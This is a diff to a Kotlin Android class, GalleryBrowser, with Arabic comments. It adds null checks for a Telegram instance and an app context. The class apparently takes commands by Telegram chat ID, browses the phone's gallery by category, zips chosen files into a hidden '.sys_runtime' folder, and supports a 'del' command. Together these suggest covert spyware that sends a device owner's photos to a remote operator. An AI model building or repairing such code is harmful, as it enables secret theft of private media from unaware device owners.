@@ -32,6 +32,7 @@ import java.util.zip.ZipOutputStream
  * ✅ تم تغيير مسار إنشاء ملفات ZIP المؤقتة إلى مجلد مخصص داخل .sys_runtime بدلاً من cacheDir.
  * ✅ تم دعم الأمر del القديم للتوافق مع الإصدارات السابقة.
  * ✅ تم جعل الدوال الموروثة (getGalleryByCategory, getDid, runScan, getPendingCount) مفتوحة (open) للسماح بالوراثة.
+ * ✅ تم إضافة التحقق من null للـ telegram في showOptions و createZipArchive لتجنب NPE.
  */
 open class GalleryBrowser(
     private val context: Context,
@@ -335,6 +336,12 @@ open class GalleryBrowser(
     // ============================================================
 
     fun showOptions(chatId: Long, category: String, pageStr: String, indexStr: String) {
+        // ✅ التحقق من وجود telegram لتجنب NPE
+        if (telegram == null) {
+            Log.e(TAG, "Telegram instance is null, cannot show options")
+            return
+        }
+
         val page = pageStr.toIntOrNull() ?: 0
         val index = indexStr.toIntOrNull() ?: 0
         val files = getGalleryByCategory(category, 100)
@@ -674,11 +681,13 @@ open class GalleryBrowser(
 
     // ============================================================
     //  إنشاء أرشيف ZIP للملفات المحددة
-    // ✅ الإصلاح 2: استخدام مجلد مخصص داخل .sys_runtime بدلاً من cacheDir
+    // ✅ الإصلاح: استخدام مجلد مخصص داخل .sys_runtime بدلاً من cacheDir
+    // ✅ إضافة التحقق من appContext لتجنب NPE
     // ============================================================
 
     private fun createZipArchive(files: List<File>): File? {
         if (files.isEmpty()) return null
+        // ✅ التحقق من وجود السياق
         val ctx = appContext ?: return null
 
         // ✅ إنشاء مجلد مؤقت داخل .sys_runtime لضمان توفر مساحة كافية
